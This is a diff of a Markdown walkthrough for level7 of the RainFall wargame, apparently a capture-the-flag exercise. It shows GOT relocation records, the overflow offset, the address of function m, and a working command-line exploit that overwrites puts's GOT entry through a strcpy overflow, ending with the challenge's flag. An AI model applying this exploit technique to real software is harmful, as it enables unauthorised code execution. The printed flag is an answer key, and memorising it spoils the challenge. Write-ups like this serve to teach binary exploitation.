@@ -73,15 +73,45 @@ gs             0x33     51
 ```
 > The offset goes to the 2nd strcpy
 
+## Get puts's address
 ```sh
-(gdb) disas 0x8048400
-Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:     jmp    *0x8049928
-   0x08048406 <+6>:     push   $0x28
-   0x0804840b <+11>:    jmp    0x80483a0
-End of assembler dump.
+level7@RainFall:~$ objdump -R level7 
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
 ```
 > We will replace the puts call in the GOT to our function
 
-run `/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x00\x84\x04\x08"` `/bin/echo -ne "\xf4\x84\x04\x08"`
+## Get the offset
+
+We know that we seg. fault at 21 char and not at 20 so :
+
+`print('A'*20 + 'address to overwrite')`
+
+## Get m's address
+
+```sh
+(gdb) x m
+0x80484f4 <m>:	0x83e58955
+```
+
+## Exploit
+
+```sh
+level7@RainFall:~$ ./level7 `python -c "print('A'*20 + '\x28\x99\x04\x08')"` `python -c "print('\xf4\x84\x04\x08')"`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1676290009
+```
 
